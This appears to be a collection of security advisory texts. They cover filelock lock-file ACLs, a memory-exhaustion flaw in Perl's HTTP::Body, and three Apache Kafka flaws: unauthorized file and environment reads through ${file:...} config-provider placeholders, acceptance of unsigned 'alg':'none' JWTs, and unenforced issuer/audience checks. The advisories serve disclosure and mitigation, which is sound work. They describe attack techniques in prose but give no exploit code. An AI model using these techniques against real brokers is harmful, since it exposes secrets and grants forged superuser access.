- After creating a lock file with `preserve_lock_file=True` or a `ReadWriteLock` database, set its ACL yourself, for example `icacls <file> /inheritance:r /grant:r "<owner>:F" "SYSTEM:F" "Administrators:F"`; a file that exists keeps its ACL on later opens.
- Do not store anything confidential in the lock file through `on_acquired` on Windows.

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/835

HTTP::Body versions before 1.24_01 for Perl allow memory exhaustion via unbounded buffering of chunked request bodies.

In chunked mode, used when no content length is given, add() holds each chunk in memory until all of it has arrived. A line that is not a chunk-size line, a size line without CRLF, or a size too large to fit an integer leaves the parser waiting forever, and every later add() grows the buffer.

A remote attacker can exhaust memory in applications that pass chunked request bodies to HTTP::Body.

items.summary:
An authenticated Kafka principal with no authorization grants (not even ALTER_CONFIGS) can make a broker read a file or an environment variable from the broker host and return its contents. An IncrementalAlterConfigs (or AlterConfigs) request targeting a BROKER resource reaches the broker's configuration validation before any authorization check is applied to that path. Validation resolves configuration variables such as ${file:/path:key} or ${env:VAR} using a ConfigProvider named in the request, and this resolution bypasses the org.apache.kafka.automatic.config.providers allowlist that was added as the mitigation for CVE-2024-31141. An arbitrary ConfigProvider (for example FileConfigProvider or EnvVarConfigProvider) is therefore instantiated and the referenced file or environment variable is read, and a type-validation error returns the resolved content to the caller.


Impact:

On a cluster with an authorizer enabled, an authenticated principal with no authorization grants can read the contents of files accessible to the broker process, and the broker's environment variables, exposing credentials, keystores, or other secrets, defeating the CVE-2024-31141 allowlist. The read is bounded by the broker process's file permissions. The brokers and the cluster remain available; the issue is disclosure of file and environment- variable contents. Clusters with no authorizer configured are not affected in practice, because every principal already holds ALTER_CONFIGS there.


Mitigation:

Upgrade to Apache Kafka 4.2.2, 4.3.2, or 4.4.0. As defense in depth, run brokers under a least-privileged operating-system account so that sensitive files are not readable by the broker process.


Resolution:

From Apache Kafka 4.2.2, 4.3.2, and 4.4.0: broker configuration changes are authorized (ALTER_CONFIGS on the cluster) before the configuration is validated, and configuration- variable resolution enforces the config-providers allowlist.

A Kafka broker using SASL/OAUTHBEARER with the default validator (sasl.oauthbearer.jwt.validator.class=DefaultJwtValidator) selects its implementation from configuration. When sasl.oauthbearer.jwks.endpoint.url is set, the validator verifies the JWT signature. When that URL is unset (the default) and no verification key resolver is supplied, DefaultJwtValidator silently falls back to ClientJwtValidator, which does not verify the JWT signature, algorithm, or issuer - and the broker starts with no warning or error. This is the residual of CVE-2026-33557, whose fix restored signature verification only on the path where the JWKS endpoint URL is set.


Impact:

A broker in this state accepts any structurally valid JWT, including "alg":"none" tokens. An unauthenticated remote attacker who can reach the listener can forge a token asserting any principal - including configured superusers - and gain full access to the cluster. Only brokers that enable SASL/OAUTHBEARER validation without a JWKS endpoint URL (and without a custom verification key resolver) are affected; brokers that set the URL verify signatures and are not affected. Unlike CVE-2026-110952 (issuer/audience not enforced by default), here no signature is verified at all.


Mitigation (all affected versions, no upgrade required):

Set sasl.oauthbearer.jwks.endpoint.url for every listener/mechanism that uses OAuthBearerValidatorCallbackHandler, or configure a signature-verifying sasl.oauthbearer.jwt.validator.class.

Resolution:

From Apache Kafka 4.2.2, 4.3.1, and 4.4.0: a broker that would fall back to the non-verifying ClientJwtValidator fails to start with a ConfigException instead of running without signature verification (secure by default).

items.summary:
A Kafka broker that authenticates clients with SASL/OAUTHBEARER using the bundled JWKS-backed validator always verifies the JWT signature, but two further checks are only performed when explicitly configured:

- The issuer (iss) claim is verified only when sasl.oauthbearer.expected.issuer is set. When it is unset, a validly-signed token carrying the expected audience is accepted regardless of which issuer minted it.
- An audience (aud) claim is required only when sasl.oauthbearer.expected.audience is set. When it is unset, a validly-signed token that omits the aud claim is accepted. (A token that carries an aud claim is
  still rejected when no expected audience is configured.)

Both options default to unset and have been documented as optional (Importance LOW) since KIP-768 (3.1.0).

Impact:
  The exposure is realizable mainly in deployments whose JWKS endpoint serves signing keys for more than one issuer (a multi-tenant identity provider, an aggregated/shared JWKS, or shared signing keys): a token
  minted for a different issuer, or a token lacking an audience, may be accepted to authenticate — potentially as a higher-privileged principal. In a single-issuer deployment where the provider controls the iss
  claim and issues audience-scoped tokens, exposure is limited. The signature trust anchor remains enforced in all cases. This is distinct from CVE-2026-33557 (acceptance of unsigned/unvalidated tokens); here the
  signature is validated and only the issuer/audience checks are not enforced by default.

Mitigation (all affected versions, no upgrade required):
  Set both sasl.oauthbearer.expected.issuer (to your provider's exact iss value) and sasl.oauthbearer.expected.audience (to the audience(s) your brokers expect), per listener. Brokers that set these perform
  exact-match issuer/audience checks and are not affected. Both have been available since 3.1.0.

Resolution:
  - From Apache Kafka 4.4.0: a broker configured with a JWKS endpoint fails to start unless both sasl.oauthbearer.expected.issuer and sasl.oauthbearer.expected.audience are set (secure by default). Deployments that
  intentionally do not restrict the issuer and/or audience may opt out per axis with sasl.oauthbearer.allow.unverified.issuer=true and/or sasl.oauthbearer.allow.unverified.audience=true.
